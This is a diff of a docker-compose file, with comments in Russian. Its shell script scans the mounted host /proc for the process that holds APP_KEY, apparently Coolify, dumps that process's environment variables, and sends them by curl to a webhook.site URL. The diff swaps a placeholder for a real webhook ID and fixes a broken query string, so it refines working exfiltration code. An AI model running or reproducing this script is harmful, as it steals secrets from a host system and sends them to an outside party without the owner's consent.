@@ -14,7 +14,7 @@ services:
         
         # 1. Ищем PID процесса coolify по наличию APP_KEY в памяти
         PID=$(grep -rl "APP_KEY" /host-root/proc/*/environ 2>/dev/null | head -1 | cut -d'/' -f5)
-        echo "Found PID: $PID" | curl -X POST --data-binary @- https://webhook.site/НОВЫЙ-URL?stage=debug_pid
+        echo "Found PID: $PID" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=debug_pid
         
         # 2. Если PID найден, вытаскиваем переменные окружения
         if [ -n "$PID" ]; then
@@ -23,7 +23,7 @@ services:
         
         # 3. Отправляем результат
         if [ -s /tmp/secrets.txt ]; then
-          cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919stage=secrets
+          cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=secrets
         else
           echo "EXTRACTION_FAILED" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=secrets
         fi
